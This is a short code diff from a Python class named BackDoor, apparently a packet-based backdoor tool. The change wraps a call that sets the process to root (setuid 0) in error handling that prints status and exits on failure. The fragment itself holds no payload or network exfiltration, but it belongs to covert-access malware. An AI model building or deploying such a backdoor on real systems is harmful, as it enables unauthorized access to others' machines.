@@ -29,7 +29,13 @@ class BackDoor:
         self.sniff_init()
 
     def set_uid(self):
-        os.setuid(0)
+        try:
+            os.setuid(0)
+            print("UID set")
+        except OSError as e:
+            print("UID not set")
+            print(f"Error: {e}")
+            sys.exit()
 
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
